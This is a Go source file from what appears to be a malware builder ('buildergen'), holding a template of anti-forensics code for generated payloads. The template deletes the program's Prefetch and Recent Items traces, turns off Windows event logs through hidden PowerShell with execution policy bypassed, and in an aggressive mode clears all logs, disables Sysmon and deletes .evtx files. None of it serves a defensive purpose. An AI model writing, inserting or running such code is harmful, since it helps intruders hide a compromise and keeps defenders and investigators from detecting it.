package buildergen

import "strings"

func templateAntiForensics() string {
	return strings.TrimSpace(`
func cleanPrefetch() {
	prefetchDir := filepath.Join(os.Getenv("SystemRoot"), "Prefetch")
	entries, err := os.ReadDir(prefetchDir)
	if err != nil {
		return
	}
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	exeName := strings.ToUpper(filepath.Base(exePath))
	for _, e := range entries {
		if strings.Contains(strings.ToUpper(e.Name()), strings.TrimSuffix(exeName, ".EXE")) {
			_ = os.Remove(filepath.Join(prefetchDir, e.Name()))
		}
	}
}

func clearRecentItems() {
	recentDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Recent")
	entries, err := os.ReadDir(recentDir)
	if err != nil {
		return
	}
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	exeName := strings.ToUpper(strings.TrimSuffix(filepath.Base(exePath), ".exe"))
	for _, e := range entries {
		if strings.Contains(strings.ToUpper(e.Name()), exeName) {
			_ = os.Remove(filepath.Join(recentDir, e.Name()))
		}
	}
}

func disableEventLogging() {
	logNames := []string{
		"Microsoft-Windows-TaskScheduler/Operational",
		"Microsoft-Windows-Services/Diagnostic",
	}
	for _, ln := range logNames {
		cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
			"-Command", fmt.Sprintf("wevtutil sl \"%s\" /e:false 2>$null", ln))
		_ = cmd.Run()
	}
}

func performAntiForensics() {
	if !isAdmin() {
		return
	}
	go cleanPrefetch()
	go clearRecentItems()
	go disableEventLogging()
}

func performAntiForensicsAggressive() {
	if !isAdmin() {
		return
	}
	go cleanPrefetch()
	go clearRecentItems()
	go disableEventLogging()

	go func() {
		cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
			"-Command", getClearAllLogsCmd())
		_ = cmd.Run()
	}()

	go func() {
		cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
			"-Command", getDisableSysmonCmd())
		_ = cmd.Run()
	}()

	go func() {
		time.Sleep(2 * time.Second)
		cmd := cmdHidden(getPowerShellExeName(), "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
			"-Command", getDeleteEvtxCmd())
		_ = cmd.Run()
	}()
}
`)
}
